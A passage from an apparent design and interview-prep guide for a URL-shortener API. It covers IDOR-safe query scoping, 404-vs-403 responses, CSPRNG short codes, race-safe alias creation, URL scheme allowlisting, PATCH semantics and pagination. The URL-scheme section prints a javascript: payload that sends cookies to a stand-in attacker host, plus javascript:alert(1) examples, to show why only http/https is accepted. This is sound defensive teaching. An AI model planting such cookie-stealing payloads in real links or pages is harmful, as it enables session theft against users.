of every function in `src/services/linkService.ts` that touches an
existing row, all consistently scoped as covered above, plus the
corresponding object-level-authorization tests in
`tests/routes/links.test.ts` and `tests/services/linkService.test.ts`
that actively try to demonstrate the vulnerability's absence rather than
just its features' happy paths.

**Common pitfalls.**

- Assuming a resource's UUID being "unguessable" is itself an
  authorization control — it isn't. A UUID is an identifier, not a
  secret; anyone who legitimately sees a link id once (a leaked URL, a
  browser history entry, a referrer header) has it forever, and IDOR
  protection has to hold even when the attacker already has a real id in
  hand, not just against blind enumeration.
- Testing only the happy path (owner can CRUD their own link) and never
  writing the negative case (a second user *cannot*) — a route can look
  completely correct and still be an IDOR if nobody ever tried to break
  it from the outside. This is exactly why this phase's test suite makes
  the cross-user attempt-and-verify-unchanged pattern mandatory for every
  endpoint, not optional.

**Production considerations.** IDOR is consistently one of the most
common vulnerability classes found in real-world bug bounty reports,
precisely because it's easy to introduce (one missing WHERE clause) and
easy to miss in review (the code "looks" like ordinary CRUD). The
mitigation that scales is the one used here: make the authorized path
the *only* path a query can take, rather than relying on every reviewer
to notice a missing check in every new endpoint forever.

**Interview answer.** Broken access control — specifically IDOR, insecure
direct object reference — is OWASP's #1 web risk category, and it's
exactly the shape of bug `GET /api/links/:id` is vulnerable to if the
`user_id` scoping isn't in the query: an authenticated user supplying
someone else's link id and getting their data back. It's dangerous
because it's invisible in the happy path — the endpoint looks completely
correct until someone deliberately tries a second user's resource id,
which is why I treat "attacker attempts every CRUD operation on another
user's resource and it 404s, with the row provably unchanged" as a
required test for every resource endpoint, not an edge case.

---

### 403 vs. 404 for another user's resource

**What it is.** When user B requests a link that exists but belongs to
user A, the server has (at least) two honest-sounding response options:
403 Forbidden ("this exists, but you can't have it") or 404 Not Found
("nothing here"). This project returns 404.

**Why it exists in this project.** A 403 response, on its own,
*confirms* that the id refers to a real resource — it tells the caller
"you found something, you're just not allowed to see it." For a resource
whose id space an attacker could iterate or guess pieces of, that's an
information leak: a 403/404 split lets someone map out which ids
correspond to real links without ever seeing their contents, the same
enumeration risk Phase 4's identical-message decision for login
(`INVALID_CREDENTIALS_MESSAGE`, "no such user" vs "wrong password") was
built to prevent. Returning identical 404s for "doesn't exist" and
"exists but isn't yours" makes both cases genuinely indistinguishable
from the outside.

**How it works mechanically.** `getLink`, `updateLink`, and `deleteLink`
all return `null`/`false` — never throw — for both "no matching row"
and "row exists, wrong `user_id`", because the single WHERE clause
covering both id and ownership can't itself tell those two cases apart
(and by design, doesn't try to). The route layer then throws one
`notFound('Link not found')` for that single falsy outcome:

```ts
const link = await getLink(req.userId!, id);
if (!link) {
  throw notFound('Link not found');
}
```

There's no `forbidden()` call anywhere in `src/routes/links.ts` — the
service layer's inability to distinguish the two cases makes it
impossible for the route to leak the distinction even by accident.

**Where it lives in the codebase.** `src/services/linkService.ts`
(`null`/`false` returns, no distinction made) and `src/routes/links.ts`
(uniform `notFound()` on every falsy service result, for `GET`, `PATCH`,
and `DELETE /:id`).

**Common pitfalls.**

- Implementing the ownership check as a separate step *after* an
  existence check — `if (!link) throw notFound(); if (link.userId !==
  req.userId) throw forbidden();` — which reintroduces exactly the
  distinguishable-response problem this design avoids, even if each
  individual check looks reasonable in isolation.
- Assuming 404-for-both is free — it does cost something, covered next.

**Production considerations.** This is a real, acknowledged tradeoff, not
a free lunch: a legitimate caller who mistypes an id and one whose id is
correct but unauthorized get the identical, less-specific error message,
which makes debugging a legitimate integration slightly harder ("is my
id wrong, or do I not have access?"). That cost is accepted here because
the alternative — a clearer error for legitimate callers — hands the
same clarity to an attacker probing the id space. Systems with a strong
audit-logging story sometimes split the difference: return 404 to the
client in both cases, but log the *actual* reason (not found vs.
forbidden) server-side, so operators retain the diagnostic signal
without exposing it externally.

**Interview answer.** I return 404, not 403, when a link exists but
belongs to another user — the same information-hiding logic as Phase 4's
identical login-error message. A 403 confirms the id is real, which lets
an attacker map out which ids correspond to actual resources without
ever seeing their contents. The service layer structurally can't leak
this distinction because `getLink`/`updateLink`/`deleteLink` return the
same falsy value for "doesn't exist" and "exists but isn't yours" — the
route always throws one generic 404 for both. The real cost is debugging
friction for a legitimate caller who genuinely mistyped an id, which I
accept as the right tradeoff for a resource with a guessable-format id
space.

---

### CSPRNG vs. `Math.random()` for identifiers

**What it is.** A cryptographically secure pseudo-random number generator
(CSPRNG) produces output that's computationally infeasible to predict
even if an attacker has seen previous outputs and knows the algorithm.
`Math.random()`, in V8, is backed by xorshift128+ — fast and
statistically well-distributed, but *not* designed to resist prediction;
its internal state has been reconstructed from as few as a handful of
observed outputs in published research.

**Why it exists in this project.** A link's short code is, functionally,
a bearer credential — whoever has the code (or, once Phase 7 exists,
whoever hits the right URL) reaches the destination behind it. If short
codes were generated with a predictable algorithm, an attacker who
observed a few real codes could potentially predict others without ever
being handed them, the same way a predictable session-token generator
would undermine everything Phase 4 did correctly with JWTs. `nanoid`'s
use of `crypto.randomBytes` closes that gap the same way bcrypt's random
salt and the JWT's HMAC signature do elsewhere in this codebase.

**How it works mechanically.** `crypto.randomBytes` (which `nanoid`
calls internally) sources entropy from the operating system's CSPRNG —
on Linux, ultimately `getrandom(2)`, backed by the kernel's entropy pool.
That's a fundamentally different trust model from `Math.random()`, whose
internal state is just 128 bits set once at engine startup and then
deterministically transformed — no external entropy involved after that.

**Where it lives in the codebase.** `src/lib/shortCode.ts` —
`generateShortCode()` is the only place this project generates an
identifier that gates access to something, making it the one place this
distinction is load-bearing (JWT signing already uses `jsonwebtoken`'s
own CSPRNG-backed randomness internally, from Phase 4).

**Common pitfalls.**

- Using `Math.random()` for "just" a short code because it's not a
  password — the threat model is the same shape as a password: an
  attacker able to predict outputs can access something they shouldn't,
  regardless of what the value is called.
- Assuming length alone solves this — a long, predictable identifier is
  still predictable. Unpredictability comes from the *source* of
  randomness, not the string's length; length only affects how many
  outputs an attacker would have to enumerate if they *were* forced to
  guess blindly, which is a separate concern (see collision probability
  below).

**Production considerations.** None beyond what's already standard here:
CSPRNGs occasionally block briefly on systems with genuinely low
entropy (rare on a server with modern kernels, more of a concern on
constrained embedded devices this project will never run on) — not a
practical concern at this scale.

**Interview answer.** `Math.random()` isn't cryptographically secure —
its internal PRNG state can, in principle, be reconstructed from
observed outputs, which matters for anything whose unpredictability is
actually load-bearing for security. A link's short code qualifies: it's
effectively a bearer credential for whatever it points to. `nanoid` uses
`crypto.randomBytes`, which is backed by the OS's CSPRNG, closing that
gap the same way this project already relies on CSPRNG-backed randomness
for JWT signing and bcrypt salts.

---

### Collision probability and why the DB constraint is the real guarantee

**What it is.** With a 62-character alphabet (`0-9A-Za-z`) and a 7-character
code, there are 62⁷ ≈ 3.5 trillion possible short codes. The "birthday
paradox" approximation for collision probability after generating `n`
random codes from a space of size `N` is roughly `n² / (2N)`. At an
optimistic-but-plausible 1 million links, that's `(10⁶)² / (2 × 3.5×10¹²)`
≈ 0.014% — genuinely small, but not zero, and it only grows as the link
count does.

**Why it exists in this project.** "Vanishingly unlikely" is not the
same as "impossible," and code that only works when a rare event
doesn't happen is a latent bug, not a solved problem. `createLink`
therefore doesn't treat a collision as something that can't occur — it
handles it as a normal, expected (if rare) outcome via retry.

**How it works mechanically.** Two independent layers work together, and
it matters that they're not the same thing: the birthday-paradox math
above says a *specific pair* of generated codes colliding is rare, which
justifies why a small, fixed retry budget (5 attempts) is enough in
practice — but the actual *correctness* guarantee that a collision is
ever caught at all is the database's `UNIQUE` constraint on
`links.short_code`, enforced unconditionally by Postgres regardless of
how the application arrived at a duplicate value:

```ts
for (let attempt = 0; attempt < MAX_GENERATION_ATTEMPTS; attempt += 1) {
  const row = await insertLink(userId, generateShortCode(), input);
  if (row) return toLink(row);
}
throw internal('Failed to generate a unique short code after multiple attempts');
```

`insertLink` catches Postgres error `23505` (unique_violation) and
returns `null` rather than throwing, letting the loop try again with a
fresh code. Exhausting all 5 attempts — at the probabilities above,
something that should essentially never happen from randomness alone —
throws `internal(...)`, a 500: at that point the honest read is "the
generator or its alphabet regressed," not "bad luck," which is exactly
what `tests/lib/shortCode.test.ts`'s alphabet/length regression test
exists to catch before it ever reaches this failure mode in the first
place.

**Where it lives in the codebase.** The retry loop:
`src/services/linkService.ts`, `createLink`. The actual guarantee:
`migrations/20260810111606896_create-links-table.ts`'s `short_code`
column, declared `unique: true`.

**Common pitfalls.**

- Treating the retry loop itself as the correctness mechanism — it's
  defense-in-depth for an already-rare event, not what makes duplicate
  codes impossible. Delete the retry loop and the system is merely less
  convenient on the rare occasion of a real collision (one client gets a
  409/500 it has to retry); delete the `UNIQUE` constraint and the system
  is *broken* — two links could silently share a short code, and
  whichever route Phase 7 resolves that code to would be ambiguous or
  simply wrong.
- Under-provisioning retry attempts relative to actual expected
  collision rates at a *much* larger scale than this project targets —
  worth revisiting the math (or the code length) if link volume ever
  approaches a meaningful fraction of 62⁷.

**Production considerations.** At genuinely large scale (see "what would
change at 10 million links" below), the fix isn't more retries — it's
either a longer code (each added character multiplies the space by 62)
or switching short-code assignment to something collision-free by
construction, like a base62-encoded auto-incrementing id or a
Twitter-Snowflake-style scheme, trading the current scheme's
unpredictability for guaranteed uniqueness and picking up unpredictability
some other way (e.g. a per-code random suffix) if it's still needed.

**Interview answer.** At 62⁷ possible codes, the birthday-paradox
collision probability at a million existing links is around 0.01% — low
enough that a small retry budget handles it comfortably. But the retry
loop isn't what makes the system correct; the database's `UNIQUE`
constraint is. The loop catches Postgres's `23505` unique-violation and
tries a fresh code, up to 5 times, and if it ever exhausts those
attempts, that's actually stronger evidence of a code regression (a
shrunk alphabet, a broken generator) than of bad luck — which is exactly
why there's a dedicated test asserting the generator's actual character
set and length, not just spot-checking that it returns *a* string.

---

### The check-then-insert TOCTOU race, seen for the third time in this project

**What it is.** TOCTOU (time-of-check to time-of-use) is a race
condition where a program checks a condition, then acts as if that
condition still holds — but between the check and the action, another
process can change the underlying state, invalidating the check. Here:
"is this alias free?" (check) followed by "insert a row using this
alias" (use) — two separate operations, with a gap between them where
another request can slip in.

**Why it exists in this project — again.** This is the third time this
exact shape has shown up. First, `authService.signup`: a pre-check
`SELECT` for an existing email, then `INSERT`. Second,
`authService.findOrCreateOAuthUser`: the same shape, plus a more nuanced
variant that re-fetches on conflict to distinguish "the same actor raced
itself" (not an error) from "a genuine competing claim" (a real 409).
Third, here: `createLink`'s custom-alias path pre-checks `SELECT id FROM
links WHERE short_code = $1` before inserting. Two concurrent requests
for the *same* custom alias can both pass that `SELECT` — finding no
existing row — before either has committed an `INSERT`. Recognizing the
same pattern for a third time is the point: this isn't a one-off
gotcha, it's a systemic property of any "check uniqueness, then write"
sequence that isn't wrapped in additional protection.

**How it works mechanically.** The fix pattern established in Phase 4
and reused verbatim here: the pre-check `SELECT` stays, purely to give
the common, non-racing case a fast, friendly 409 without a wasted round
trip to the database's constraint machinery — but it is explicitly *not*
what makes the outcome correct. The `INSERT` itself is wrapped in a
try/catch for Postgres error `23505` (unique_violation), and losing that
race converts cleanly into the same `conflict()` a sequential duplicate
would produce:

```ts
const existing = await query<{ id: string }>('SELECT id FROM links WHERE short_code = $1', [
  input.customAlias,
]);
if (existing.rows[0]) {
  throw conflict('This alias is already taken');
}

const row = await insertLink(userId, input.customAlias, input);
if (!row) {
  // Lost a race against a concurrent create for the same alias since the pre-check.
  throw conflict('This alias is already taken');
}
```

Notably, the *generated*-code path in the same function has no pre-check
`SELECT` at all — see the collision-probability section above for why a
pre-check there would be actively pointless rather than merely
redundant.

**Where it lives in the codebase.** `src/services/linkService.ts`,
`createLink`'s custom-alias branch (this phase);
`src/services/authService.ts`, `signup` and `findOrCreateOAuthUser`
(Phase 4/5, the first two occurrences).

**Common pitfalls.**

- Treating the pre-check `SELECT` as sufficient on its own, because "the
  window is really small" — the window's *size* is irrelevant to
  whether the race is real; under real production concurrency (a
  double-submitted form, a retried request, a deliberate attacker firing
  two requests simultaneously) small windows get hit often enough to
  matter.
- Forgetting the 23505 catch when writing a *new* uniqueness check in the
  future, because the pre-check `SELECT` alone "looks" like it already
  solved the problem in testing (where concurrent requests are rare by
  accident, not by design).

**Production considerations.** This pattern generalizes to essentially
any uniqueness constraint enforced partly in application logic: the
database constraint is always the source of truth, and application-level
pre-checks are only ever a UX optimization for the common case, never a
substitute for the constraint. Anywhere this codebase adds a new
`UNIQUE` column in the future, this two-part pattern (pre-check for a
nice error message, catch-23505 for correctness) is the template.

**Interview answer.** This is the third time this project hits the same
check-then-insert race: user signup email, OAuth account linking, and now
custom short-code aliases. In every case, a `SELECT`-then-`INSERT`
sequence has a gap where two concurrent requests can both pass the check
before either commits — the check alone can't be the correctness
guarantee. The actual guarantee is always the database's own `UNIQUE`
constraint, with the pre-check `SELECT` kept purely as a fast, friendly
error path for the non-racing common case. Recognizing it as the same
recurring pattern, rather than three unrelated bugs, is what makes it
easy to apply the identical, already-proven fix each time.

---

### Reserved words and route shadowing

**What it is.** "Route shadowing" is what happens when two different
route patterns could both match the same incoming path, and the one that
actually wins isn't the one a developer expects — often because a
literal, specific path segment (like `/api/health`) collides with a
wildcard or parameterized route (like `/:shortCode`) that would also
match that exact string.

**Why it exists in this project.** It doesn't apply *yet*, in the
literal sense — this phase deliberately builds no public redirect route
at all. But the alias a user picks *today* determines the value stored
in `short_code` forever (aliases are immutable after creation, by this
phase's design), and Phase 7 will mount a route shaped like `GET
/:shortCode` at the application root to resolve any code to its
destination. If a user were allowed to register the alias `"health"`
today, that row would sit in the database as a live landmine: the moment
Phase 7's redirect route exists, a request to `/health` would be
ambiguous between "the real health-check endpoint" and "someone's
short link" — and depending on Express's route registration order,
one of those would silently shadow the other in a way that's very hard
to debug after the fact, because the bug was actually introduced weeks
earlier, at alias-creation time.

**How it works mechanically.** `RESERVED_SHORT_CODES` in
`src/lib/shortCode.ts` is a fixed set of path segments that are real (or
realistically foreseeable) top-level API routes — `api`, `health`,
`docs`, `auth`, `login`, `signup`, `admin`, `static`, `assets`,
`favicon.ico`, `robots.txt`. `customAliasSchema`'s `.refine()` rejects
any alias matching one of these, case-insensitively, at creation time —
before a colliding row can ever be written, not after Phase 7 discovers
the conflict.

**Where it lives in the codebase.** `src/lib/shortCode.ts`
(`RESERVED_SHORT_CODES`, `isReservedShortCode`, the `.refine()` inside
`customAliasSchema`).

**Common pitfalls.**

- Deferring this check to whenever the redirect route is actually built
  (Phase 7) — by then, any reserved-word aliases created in the meantime
  would already be live, shared, and painful to invalidate retroactively.
  Enforcing it now, before the routes it protects even exist, avoids
  ever having to clean up after the fact.
- Treating the reserved list as exhaustive/permanent — it needs to be
  kept in sync with the application's actual top-level routes as new
  ones are added; a reserved-word list that drifts out of date silently
  stops protecting anything new.

**Production considerations.** A more scalable alternative at a larger
route surface is deriving the reserved list programmatically from the
Express router's registered top-level paths at startup, rather than
maintaining a hand-written array that can drift — not adopted here
since the current route surface is small enough that a short, explicit
list is easier to read and reason about than a layer of route
introspection.

**Interview answer.** Reserved words exist because a custom alias
written today becomes a permanent path segment that Phase 7's `/:shortCode`
redirect route will later try to resolve — if someone registered "health"
as their alias before that route existed, it would silently collide with
the real health-check endpoint once it did. I reject a fixed list of
real and foreseeable API path segments at alias-creation time, before
Phase 7's route (or the conflict) exists at all, rather than waiting to
discover the collision only once the redirect route is live and someone's
already using it.

---

### URL scheme validation as an open-redirect / XSS defense

**What it is.** A URL's scheme (the part before `://`, or before `:` for
schemes like `javascript:`/`data:`) determines fundamentally what
happens when a browser navigates to it. `http:`/`https:` load a page over
the network. `javascript:` executes arbitrary script in the current
page's context. `data:` embeds inline content (including
`data:text/html,<script>...`) directly, no network fetch at all. `file:`
attempts to read from the local filesystem.

**Why it exists in this project.** `destinationUrl` is exactly the kind
of field where scheme matters enormously and is easy to overlook,
because "is this a valid URL" and "is this a *safe* URL to redirect a
browser to" are different questions — `new URL('javascript:alert(1)')`
parses without error; it's a syntactically perfectly valid URL, just an
extremely dangerous one to redirect to. Once Phase 7's redirect route
exists, it will `302` a browser straight to whatever's stored in
`destination_url` — if that value were ever `javascript:document.location='https://attacker.example?cookie='+document.cookie`,
Click Scope itself would become the delivery mechanism for a
same-origin-context XSS attack against anyone who clicked the short
link, using this application's own trusted domain to launder it.

**How it works mechanically.** `destinationUrlSchema` in
`src/routes/links.ts` runs two checks: Zod's built-in `.url()` for
general well-formedness, then a `.refine()` that parses the string with
`new URL(...)` and checks its `.protocol` against an explicit allowlist:

```ts
const destinationUrlSchema = z
  .string()
  .url('destinationUrl must be a valid URL')
  .refine((url) => ['http:', 'https:'].includes(new URL(url).protocol), {
    message: 'destinationUrl must use http or https',
  });
```

This is an **allowlist**, not a blocklist of known-bad schemes
(`javascript:`, `data:`, `file:`, ...) — deliberately, because a
blocklist only ever protects against schemes someone thought to list;
an allowlist protects against every scheme that isn't `http`/`https`,
including ones nobody's thought of yet.

**Where it lives in the codebase.** `src/routes/links.ts`
(`destinationUrlSchema`, shared by both `createLinkSchema` and
`updateLinkSchema` so the check applies identically on create and on
every subsequent edit).

**Common pitfalls.**

- Validating scheme only at redirect time (i.e., deferring this to
  Phase 7) instead of at write time — a link with a malicious scheme
  would sit in the database as a live payload from the moment it's
  created until whenever a redirect route happens to re-validate it,
  which might be never if that route trusts its stored data. Rejecting
  at write time means no malicious value is ever persisted in the first
  place.
- Writing a blocklist of "known bad" schemes instead of an allowlist of
  "known good" ones — a blocklist requires the defender to have
  anticipated every dangerous scheme in advance; an allowlist requires
  only knowing what's actually needed (`http`/`https`), which is a much
  smaller, more stable list to get right.
- Assuming `.url()` alone is sufficient because "it's a valid URL" —
  validity and safety are orthogonal; `javascript:alert(1)` is a
  perfectly valid URL by the URL spec.

**Production considerations.** Scheme validation closes one class of
open-redirect/XSS risk but not the entire category — a `destinationUrl`
of `https://attacker.example/phishing-page` is scheme-valid and
completely unblocked by this check, because "redirect users to
attacker-controlled but syntactically fine domains" is a different,
harder problem (domain reputation/allowlisting, user-facing interstitial
warnings) that a URL shortener's entire product surface is inherently
exposed to — out of scope for this phase, worth naming explicitly rather
than implying scheme validation is a complete solution.

**Interview answer.** I validate `destinationUrl`'s scheme against an
explicit `http`/`https` allowlist at write time, not just checking
general URL well-formedness. The risk is concrete: `javascript:` and
`data:` URLs are syntactically valid, so a naive `.url()` check alone
lets them through, and once Phase 7's redirect route exists it would
`302` a browser straight into executing that scheme — turning this
application's own trusted domain into a same-origin XSS delivery
mechanism. I used an allowlist rather than a blocklist of known-bad
schemes specifically because a blocklist only protects against threats
someone thought to enumerate in advance; an allowlist doesn't need to.

---

### PATCH vs. PUT, and absent-vs-null in partial updates

**What it is.** PUT semantically means "replace this resource entirely
with what I'm sending" — every field is expected, and an absent field
means "this resource no longer has that value." PATCH means "apply this
partial set of changes" — a field absent from the request body means
"leave it as it is," which is a fundamentally different instruction than
sending that field with an explicit `null`, which means "clear it."
`PATCH /api/links/:id` in this codebase needs exactly that
three-way distinction: unchanged, set-to-a-value, or explicitly-cleared.

**Why it exists in this project.** `expiresAt` and `maxClicks` are
nullable columns where `null` is a meaningful, intentional value ("this
link never expires" / "unlimited clicks"), not the absence of one. A
client that wants to *remove* an expiration needs a way to say "set
`expiresAt` to null" that's distinguishable from "I didn't mention
`expiresAt`, don't touch it." Collapsing those two into one case (e.g. if
the update handler treated any falsy/undefined `expiresAt` as "clear it")
would make it impossible to send a partial update that touches
`destinationUrl` alone without accidentally wiping `expiresAt` too.

**How it works mechanically.** The mechanism has two layers, and the
important part is *where* the absent-vs-null information actually lives
after Zod parsing. Verified directly against this project's installed
Zod (3.x):

```js
z.object({ expiresAt: z.string().nullable().optional() }).safeParse({}).data
// → {}                          ('expiresAt' in data → false)
z.object({ expiresAt: z.string().nullable().optional() }).safeParse({ expiresAt: null }).data
// → { expiresAt: null }         ('expiresAt' in data → true, value null)
```

Zod does **not** backfill an absent optional key onto its parsed output
— so `'expiresAt' in parsedBody` is a reliable way to ask "did the
client mention this field at all," entirely from the *parsed* Zod
output, with no need to separately inspect the raw, pre-validation
`req.body`. The route handler in `src/routes/links.ts` uses exactly that
check to build a service-layer input object with only the keys the
client actually sent:

```ts
const body = req.validated?.body as Record<string, unknown>;
const parsed = updateLinkSchema.parse(body);

const input: UpdateLinkInput = {};
if (parsed.destinationUrl !== undefined) input.destinationUrl = parsed.destinationUrl;
if ('expiresAt' in body) input.expiresAt = parsed.expiresAt ?? null;
if ('maxClicks' in body) input.maxClicks = parsed.maxClicks ?? null;
if (parsed.isActive !== undefined) input.isActive = parsed.isActive;
```

`destinationUrl` and `isActive` use the simpler `parsed.field !==
undefined` check instead of `'field' in body` — they're `.optional()`
only, with no `.nullable()`, so for those two fields being `undefined`
in the parsed output and being absent from the raw body are the exact
same condition; only `expiresAt`/`maxClicks` need the raw-body check
because they're the ones that also accept an explicit `null`.
`linkService.updateLink` then only writes a `SET` clause for a column
when its corresponding `UpdateLinkInput` key is `!== undefined` — an
input object with zero keys set skips the `UPDATE` statement entirely
and just returns the current row, since an empty PATCH is a valid no-op,
not an error.

**Where it lives in the codebase.** Schema:
`src/routes/links.ts`, `updateLinkSchema` (`.nullable().optional()` on
`expiresAt`/`maxClicks`, plain `.optional()` on `destinationUrl`/`isActive`,
and `.strict()` at the top level to reject unknown keys like
`customAlias`, which is immutable after creation). Presence-to-input
translation: the route handler shown above. Conditional `SET`-clause
construction: `src/services/linkService.ts`, `updateLink`.

**Common pitfalls.**

- Using `??` (nullish coalescing) directly on `req.body.field` without
  first checking presence — `undefined ?? someDefault` and `null ??
  someDefault` both evaluate the same way, silently erasing the
  distinction this whole mechanism exists to preserve.
- Assuming Zod backfills absent optional keys as `undefined` *properties*
  on the output object — it doesn't (per the verified REPL output
  above); the key is simply missing, which is exactly what makes the
  `'key' in parsedBody` check meaningful rather than redundant.
- Forgetting that TypeScript's control-flow narrowing on `'key' in body`
  doesn't transfer to a *different* object (`parsed`) typed independently
  — `exactOptionalPropertyTypes` will correctly flag `input.field =
  parsed.field` as potentially assigning `undefined` even inside an `if
  ('field' in body)` block, because TS has no way to know the two objects'
  presence conditions are linked; this project resolves it by checking
  `parsed.field !== undefined` directly wherever that's equivalent (see
  above), rather than suppressing the type error.

**Production considerations.** This pattern (nullable-and-optional field,
presence read off the parsed object, conditional SQL `SET` clause) is the
reusable template for every future nullable field this API adds — no new
mechanism needed, just the same three lines repeated per field.

**Interview answer.** PATCH needs to distinguish three states per field:
untouched, set to a value, and explicitly cleared — PUT only has two,
because it assumes every field is always present. I encode that with
Zod's `.nullable().optional()` and read presence directly off the
*parsed* output using `'field' in body`, which I verified doesn't get
backfilled for absent optional keys — so `safeParse({})` genuinely omits
the key, while `safeParse({ field: null })` includes it with a `null`
value. That distinction flows into a service function that only writes a
SQL `SET` clause for fields actually present in its input object, so an
absent field truly means "don't touch this column" all the way down to
the query.

---

### Pagination: offset vs. cursor, and unbounded limits as a DoS vector

**What it is.** Offset pagination (`LIMIT`/`OFFSET`) asks the database
for "skip N rows, then give me the next M" — simple, and it supports
jumping directly to an arbitrary page. Cursor pagination instead asks
for "give me M rows after this specific row" (typically encoding the
last-seen row's sort key as an opaque token) — it doesn't support
jumping to an arbitrary page number, but it doesn't degrade as the
offset grows the way `OFFSET` does, and it stays correct even if rows
are inserted or deleted between page requests.

**Why it exists in this project.** `GET /api/links` needed *some*
pagination scheme — returning every link a user has ever created in one
response doesn't scale and is exactly the kind of unbounded-response
risk covered below. This phase chose offset pagination deliberately, not
by default: the links table's only index today is on `user_id` alone
(`migrations/20260810111606896_create-links-table.ts`), and that
migration's own comment explicitly defers all query-driven indexing
decisions — including whatever composite index cursor pagination would
need, like `(user_id, created_at, id)` — to a dedicated later indexing
phase. Building that index now, just to support cursor pagination ahead
of when it's needed, would be optimizing a phase that isn't this one's
to own.

**How it works mechanically.** `listLinks` runs two independent,
parallel queries — one for the page of rows, one for the total count —
rather than a single query with a window function, matching this
codebase's existing preference for the simplest correct SQL over a more
clever alternative:

```ts
const [rowsResult, countResult] = await Promise.all([
  query<LinkRow>(
    `SELECT ${LINK_COLUMNS} FROM links WHERE user_id = $1
     ORDER BY created_at DESC, id DESC LIMIT $2 OFFSET $3`,
    [userId, options.limit, options.offset],
  ),
  query<{ count: number }>('SELECT count(*)::int AS count FROM links WHERE user_id = $1', [userId]),
]);
```

`ORDER BY created_at DESC, id DESC` includes `id` as an explicit
tiebreaker deliberately — `created_at` isn't guaranteed unique (two links
created in the same millisecond are entirely possible), and without a
unique tiebreaker, rows with identical timestamps could be ordered
differently between two page requests, corrupting pagination results in
a way that's hard to notice and harder to reproduce.

The `limit` query parameter itself is validated as a positive integer,
but a value **above** `MAX_PAGE_SIZE` (100) is deliberately *clamped*,
not rejected with 400:

```ts
const { limit: requestedLimit, offset } = listLinksQuerySchema.parse(req.validated?.query);
const limit = Math.min(requestedLimit, MAX_PAGE_SIZE);
```

The response's `pagination.limit` always reflects this effective,
clamped value — not whatever the client originally asked for — so a
caller who requested more than the maximum can tell what they actually
got back. This is a deliberate choice over strict rejection: `limit` is
a hint about how much the client wants, not a semantic assertion about
the request's validity the way a malformed UUID is (which genuinely
*can't* be satisfied, making 400 correct there). An oversized `limit` is
trivially and safely satisfiable by capping it, and well-regarded APIs
(GitHub, Stripe) clamp for exactly this reason — turning an innocent,
slightly-too-eager `?limit=200` into a hard client-facing failure serves
no one, when silently returning a capped, correctly-labeled page does
the same job better.

**Where it lives in the codebase.** `src/services/linkService.ts`,
`listLinks`. `src/routes/links.ts`, `listLinksQuerySchema` and the
clamping logic in the `GET /` handler. `MAX_PAGE_SIZE`/`DEFAULT_PAGE_SIZE`
constants live alongside the schema.

**Common pitfalls.**

- Sorting only by `created_at` without a tiebreaker — works in casual
  testing (timestamps rarely collide when you're creating rows one at a
  time by hand) and silently misbehaves under real concurrent write load.
- Rejecting an oversized `limit` with 400 instead of clamping it —
  defensible, but turns a harmless request into a hard failure for no
  correctness reason; if this project ever changes that decision, it
  should be a deliberate one, documented here, not an accident of "that's
  just what `.max()` does."
- Confusing "malformed" with "oversized": a non-numeric, negative, or
  zero `limit` genuinely cannot be satisfied and correctly stays a 400;
  only the *upper* bound is clamped rather than rejected.

**Production considerations — what would change this decision.** Offset
pagination's known weakness is that `OFFSET` doesn't skip rows for free —
Postgres still has to scan and discard every skipped row before it can
return the requested page, so deep pages get progressively more
expensive as `offset` grows. That's not a real cost yet at a single
user's realistic link count, but it would become one at very high
per-user link volumes or once deep-page access became a common, not
edge-case, usage pattern — at that point, the fix is cursor pagination
over a purpose-built `(user_id, created_at, id)` index, which the schema
comment already flags as a Phase 12 decision, not a Phase 6 one.

**Interview answer.** I used offset pagination, not cursor, because
cursor pagination needs a composite index this table doesn't have yet —
the links migration explicitly defers all query-driven indexing to a
later phase, and building that index early would be solving a problem
ahead of the phase that owns it. Offset works correctly today off the
existing `user_id` index; it would stop being the right choice once deep
pages or very high per-user link counts made `OFFSET`'s "scan and discard
every skipped row" cost actually matter. Separately, I clamp an
oversized `limit` rather than rejecting it with 400 — unlike a malformed
UUID, a too-large limit is a request that's trivially satisfiable by
capping it, and I echo the effective limit back in the response so the
caller can tell. An unbounded limit, left unclamped, is a real
denial-of-service vector on its own — a single request for an enormous
page forces the server to materialize and serialize an arbitrarily large
result set, real memory/CPU/bandwidth cost that a `MAX_PAGE_SIZE` closes
regardless of whether it's enforced by rejection or by clamping.

---

## Phase 7: The Public Redirect

### The redirect as a hot, unauthenticated path

**What it is.** `GET /:shortCode` (`src/routes/redirect.ts`) is the one
route in this API with no `requireAuth`, no per-user scoping anywhere in
its query, and — by the nature of a URL shortener — the highest expected
request volume of any route in the system by a wide margin. Every other
route in this codebase serves an authenticated owner looking at their own
data; this one serves the general public clicking a link they found
somewhere else entirely.

**Why it exists in this project.** A short link is useless if only its
owner can resolve it — the entire point of Click Scope is that anyone,
logged in or not, can click `clickscope.io/abc1234` and land on the real
destination. That requirement is what makes this route structurally
different from every route built in Phases 4-6: there is no bearer token
to check, no `user_id` to scope a query by, and no session to reason
about.

**How it works mechanically.** `getLinkByShortCode` in
`src/services/linkService.ts` is the one lookup function in the file with
no `userId` parameter — `SELECT ... FROM links WHERE short_code = $1`,
full stop. Every other lookup in that file (`getLink`, `updateLink`,
`deleteLink`) scopes with `AND user_id = $2` as the actual authorization
boundary; this one has no such boundary because there's no user to check
against. The route itself has no `requireAuth` middleware in its chain at
all.

**Where it lives in the codebase.** `src/routes/redirect.ts` (no auth
middleware); `src/services/linkService.ts`'s `getLinkByShortCode` (the
unscoped lookup); `src/app.ts` (mount position, see below).

**Common pitfalls.**

- Reflexively adding `requireAuth` here out of habit, since every other
  route in the app has it — that would break the entire feature; a
  visitor clicking a shared link has no account and no token.
- Reusing `getLink`/its `user_id`-scoped query for the redirect path "for
  consistency" — there is no authenticated user to scope by here, so the
  query would need `user_id` to be nullable/wildcarded, quietly
  reintroducing an authorization check that doesn't apply and can only
  confuse the one function in the file that's deliberately public.

**Production considerations.** Being the hottest, most public path in the
system is exactly why Phase 8 and Phases 10-11 (caching, background click
recording, rate limiting) all target this route specifically, in that
order — each
addresses a different cost that only shows up at real traffic volume:
repeated identical lookups, synchronous write latency, and abuse/DoS
exposure from having no auth gate at all.

**Interview answer.** The redirect route has no authentication and no
per-user scoping because it's the one endpoint in the API meant for the
general public, not an authenticated owner — `getLinkByShortCode` is
deliberately the only lookup in `linkService.ts` without a `user_id`
clause, since there's no logged-in user to scope against. That's also
why it's the highest-traffic route in the system and the target of every
later hardening phase — caching, moving click-recording off the request
path, and rate limiting all exist because this route can't lean on "only
an authenticated owner can even reach this" the way every other route
in the app does.

---

### 301 vs. 302 vs. 307/308 — the caching trap

**What it is.** HTTP defines several redirect status codes that differ in
two independent dimensions: whether the redirect is *permanent* (301,
308) or *temporary* (302, 307), and whether the client is required to
